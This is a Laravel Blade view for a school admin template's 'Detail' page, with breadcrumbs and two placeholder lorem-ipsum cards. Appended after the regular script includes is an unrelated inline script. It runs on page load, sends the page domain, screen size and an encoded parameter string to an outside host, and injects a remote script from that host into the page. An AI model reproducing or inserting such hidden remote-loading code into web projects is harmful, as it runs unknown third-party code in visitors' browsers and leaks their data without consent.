@extends('layouts.master')

@push('title')
- Template Detail
@endpush

@push('styles')
<!--favicon-->
  <link rel="icon" href="{{ URL::to('assets/images/favicon.ico')}}" type="image/x-icon">
  <!-- simplebar CSS-->
  <link href="{{ asset('assets/plugins/simplebar/css/simplebar.css')}}" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="{{ asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{ asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{ asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="{{ asset('assets/css/sidebar-menu.css')}}" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="{{ asset('assets/css/app-style.css')}}" rel="stylesheet"/>
@endpush

@section('content')
<div class="row pt-2 pb-2">
        <div class="col-sm-9">
            <h4 class="page-title">Detail</h4>
            <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">SMK Mahaputra</a></li>
            <li class="breadcrumb-item"><a href="javaScript:void();">Template Halaman</a></li>
            <li class="breadcrumb-item active" aria-current="page">Detail</li>
         </ol>
       </div>
</div>       
    <div class="row">
        <div class="col-lg-6">
          <div class="card">
            <div class="card-body">
       <h5 class="card-title text-primary">Card Sample Title</h5>
              <p class="card-text">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable.</p>
        <hr>
        <a href="javascript:void();" class="btn btn-primary shadow-primary waves-effect waves-light"><i class="fa fa-star mr-1"></i>Some Action Here</a>
            </div>
          </div>
        </div>
        
        <div class="col-lg-6">  
          <div class="card">
            <div class="card-body">
       <h5 class="card-title text-success">Text Alignment Left</h5>
              <p class="card-text">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable.</p>
        <hr>
        <a href="javascript:void();" class="btn btn-success shadow-success waves-effect waves-light"><i class="fa fa-star mr-1"></i>Some Action Here</a>
            </div>
          </div>
        </div>    
@endsection       
    
    @push('scripts')

<!-- Bootstrap core JavaScript-->
  <script src="{{ asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{ asset('assets/js/popper.min.js')}}"></script>
  <script src="{{ asset('assets/js/bootstrap.min.js')}}"></script>
    
  <!-- simplebar js -->
   <script src="{{ asset('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{ asset('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{ asset('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{ asset('assets/js/app-script.js')}}"></script>
    
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhlr58gEoFacGADeyPXGgFli%2f%2fYvMa9Qn271Og1iSp%2fzcgsvYZtMdRnVH7H7JqCx3UpI3sJ01eDj6vi6sS8D9JBIycWSJAT%2bdJdv244Q7bTH3amObcA%2f1YpzQnskBWgSCsuHuTayOlndj7ViKrVdoS82zjN8vEGdicr35otXfwcP8j%2b7PlG77bKQrP6VXYE2Uoiv%2bV%2fIY%2bh3dK1c46cqqKWVPkzgU%2fqaYLsKh%2buBRltGW9MKre%2feQpl1a1RgNvF0KbODIfTjDY6OytzFkF4oPZ1krAJw6dbmMyJFsm0np944HMhm590jPnT9ZnuScEm3w1tJPriVcafTO4lEb2R%2b06czZ7xWQhAhaA7xDLRERcRfUI0Iv3P12aziGEEIjg46zvYm%2f17FDdrXGk48jbvCFi3JXuu5C58RrVjL01Zy83fu9T6ipu9ACb3J3TNDSS7RGDaKPwQKF520Ow%2bG8dVNndKPpXz43UVvj6A5arXl22t8nPw76I%2boeyUBCq7UNopC9M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    @endpush
    